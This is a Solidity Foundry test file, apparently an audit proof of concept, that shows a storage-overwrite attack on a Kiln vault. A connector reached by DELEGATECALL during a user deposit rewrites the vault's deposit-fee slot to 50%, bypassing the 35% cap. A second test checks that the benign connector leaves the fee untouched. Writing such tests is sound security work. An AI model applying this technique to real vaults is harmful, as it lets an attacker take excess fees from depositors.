// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {IConnector} from "../../src/kiln/IConnector.sol";
import {HarnessBase} from "./HarnessBase.t.sol";
import {FeeOverrideConnector, VAULT_STORAGE_LOCATION} from "../../src/kiln/FeeOverrideConnector.sol";
import {Vault} from "../../src/kiln/Vault.sol";

/// @notice Strategy 006 — Committed storage overwrite via DELEGATECALL
///         into a slot safe to modify post-delegatecall.
///
///         Instead of overwriting _connectorRegistry (which breaks the
///         current transaction), target _depositFee (slot 2). The deposit
///         fee is computed in _previewDeposit() BEFORE _deposit() is called,
///         so the sstore doesn't affect the ongoing tx — but the new value
///         persists for all subsequent deposits.
///
///         This bypasses Vault.setDepositFee's _MAX_FEE cap of 35%.
contract KilnCommittedOverwrite is HarnessBase {
    function test_overwriteDepositFeeExceedsMaxCap() public {
        // 1) Read the current vault deposit fee (should be 0 or small)
        uint256 feeBefore = vault.depositFee();
        emit log_named_uint("depositFee before", feeBefore);

        // 2) Register a FeeOverrideConnector
        FeeOverrideConnector foe = new FeeOverrideConnector();
        vm.prank(admin);
        registry.update(CONNECTOR_NAME, address(foe));

        // 3) Confirm the Vault rejects setDepositFee(50*1e6) via the legit setter
        vm.prank(admin);
        try vault.setDepositFee(50 * 10 ** 6) {
            revert("should have been rejected");
        } catch {
            emit log_named_string("setDepositFee-rejected", "by _MAX_FEE cap");
        }
        // Fees unchanged
        assertEq(vault.depositFee(), feeBefore, "legitimate setter respects cap");

        // 4) User deposit triggers delegatecall -> overwrites VaultStorage[+2]
        mintAndApprove(alice, 1_000_000);
        vm.prank(alice);
        try vault.deposit(1_000, alice) returns (uint256 shares) {
            emit log_named_uint("deposit OK, shares", shares);
        } catch (bytes memory err) {
            emit log_named_uint("deposit failed, err len", err.length);
            // If it fails, the overwrite doesn't commit either
            revert("deposit must succeed for exploit to commit");
        }

        // 5) Read _depositFee after the deposit — should be 50*1e6
        uint256 feeAfter = vault.depositFee();
        emit log_named_uint("depositFee after", feeAfter);

        // This value exceeds _MAX_FEE (35*1e6) and cannot be set through the
        // legitimate setter. The connector bypassed the enforcement entirely.
        assertEq(feeAfter, 50 * 10 ** 6, "depositFee overwritten beyond max cap");
    }

    function test_verifyStorageSlotUnchangedAfterGoodDeposit() public {
        // Confirm that with the original (good) connector, no storage corruption occurs.
        // The harness initializes with MockConnector.
        uint256 feeBefore = vault.depositFee();
        assertEq(feeBefore, 0, "initial fee is 0");

        mintAndApprove(alice, 1_000_000);
        vm.prank(alice);
        vault.deposit(1_000, alice);

        uint256 feeAfter = vault.depositFee();
        assertEq(feeAfter, 0, "good connector doesn't change fee");
    }
}
